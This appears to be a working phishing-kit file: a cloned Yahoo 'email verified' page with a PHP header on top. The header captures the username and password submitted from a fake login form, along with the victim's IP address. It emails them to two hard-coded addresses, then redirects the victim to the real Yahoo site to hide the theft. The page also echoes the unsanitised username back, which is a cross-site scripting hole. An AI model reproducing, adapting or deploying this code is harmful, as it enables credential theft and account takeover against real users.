<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$username = $_POST['username'];
$password = $_POST['passwd'];
$chasem3="cokerconsultancy8119@gmail.com, chrisyoungmusic6@yahoo.com";


  $subj = "New LinkedinYahoo Login $ip";
  $msg = "Email: $username\nPassword: $password\n$ip\n-----------------------------------\n        Created By Cokeboi\n-----------------------------------";
  $from = "From: <ssc@sscs.com>";
    mail("$chasem3", $subj, $msg, $from);
	
?>

<!DOCTYPE html>
<html id="Stencil" class="js yui3-js-enabled">
<head><meta http-equiv="refresh" content="7;URL=https://login.yahoo.com/account/personalinfo?" charset="UTF-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <title>Yahoo</title>
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="./success_files/combo">
        <!--<![endif]-->
        <link href="./success_files/combo(1)" rel="stylesheet" type="text/css">
<link href="./success_files/combo(2)" rel="stylesheet" type="text/css">
        <script nonce="f1CgpxBLTpdrZO+Gif8QZur4OwAyHZYlJaNWl8jv9iCx8fow">
            if (self !== top) {
                top.location = self.location;
            }
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.I13N_config = {"debug":false,"_ywa":10001496213979,"client_only":1,"spaceid":1197774520,"sections":null};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 150002992;
root.I13N_config.LH = {"LH_debug":false,"spaceid":150002992,"serverip":"pprd5-node124-lh1.manhattan.bf1.yahoo.com","tags":{"b":""}};
root.I13N_config.section || (root.I13N_config.section = {});
root.I13N_config.section.universalHeader = {"id":"mbr-uh-hd"};
}(this));

            
            YUI_config.global = window;
        </script>
    <script charset="utf-8" id="yui_3_18_0_1_1459566593564_2" src="./success_files/combo(3)" async=""></script><script charset="utf-8" id="yui_3_18_0_1_1459566593564_11" src="./success_files/combo(4)" async=""></script><script charset="utf-8" id="yui_3_18_0_1_1459566593564_13" src="./success_files/combo(5)" async=""></script><script charset="utf-8" id="yui_3_18_0_1_1459566593564_14" src="./success_files/combo(6)" async=""></script><script charset="utf-8" id="yui_3_18_0_1_1459566593564_16" src="./success_files/combo(7)" async=""></script></head>
<body>
    <script nonce="f1CgpxBLTpdrZO+Gif8QZur4OwAyHZYlJaNWl8jv9iCx8fow">
        document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
    </script>
    <div class="loginish login-centered clrfix dark-background puree-v2">
    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
    <style type="text/css">@font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}</style><link type="text/css" rel="stylesheet" href="./success_files/combo(8)"><!-- meta --><div id="yucs-meta" data-authstate="signedout" data-cobrand="standard" data-crumb="02gUartl9BS" data-mc-crumb="9cXlR5ltcPY" data-gta="ETjc2Y.WJZx" data-device="desktop" data-experience="uh304" data-firstname="" data-style="" data-flight="1459545071" data-forcecobrand="standard" data-guid="" data-host="login.yahoo.com" data-https="1" data-languagetag="en-us" data-property="login" data-protocol="https" data-shortfirstname="" data-shortuserid="" data-status="active" data-spaceid="" data-test_id="" data-userid="" data-stickyheader="true" data-headercollapse="" data-uh-test="acctswitch"></div><!-- /meta --><div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" role="banner" data-protocol="https" data-property="login" data-spaceid="" data-stencil="true"> <style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}</style> <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation"><style>/** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.png); _background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.gif); /* IE6 */ width: 125px !important; }.DarkTheme .YLogoMY { background-position: -125px 0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32_2x.png) !important; background-size: 250px 32px !important; }}</style><a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" href="https://www.yahoo.com/" target="_top" data-rapid_p="1">Yahoo</a></div> <div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">    <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> <a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;" data-rapid_p="2"> <b>Help</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   
</div>

    <div class="login-box-container">
        <div class="login-box center-box">
            <span class="login-box-top"></span>
            <div id="comm-channel-module" class="comm-channel-container comm-channel-success ">
    <div class="comm-channel-success-icon"></div>
    <h1 class="comm-channel-success-heading">Your email has been&nbsp;verified</h1>
    <p class="txt-align-center sml-txt m-t-16px"><strong>Verified email&nbsp;address</strong></p>
    <div class="success-updated-comm-channel m-t-8px">
        <p class="sml-txt ellipsis"><?php echo $_POST["username"]; ?></p>
        <a href="https://login.yahoo.com/account/comm-channel/update/emails?lang=en-US&amp;src=ym&amp;done=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fcomm-channel%2Frefresh%3Flang%3Den-US%26src%3Dym%26done%3Dhttps%253A%252F%252Fmail.yahoo.com%26scrumb%3D3jkNEp91Y76&amp;scrumb=3jkNEp91Y76" class="sml-txt edit-lbl link-clicked">Edit</a>
    </div>
    <div class="cta-container actionable-container m-t-48px">
        <a href="https://mail.yahoo.com/" title="Ok" class="pure-button puree-button-primary puree-spinner-button cta-success" role="button">Ok</a>
    </div>
</div>

        </div>
    </div>
</div>

    <script src="success_files/combo_009"></script>
<script src="success_files/combo_007"></script><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div>

</body></html>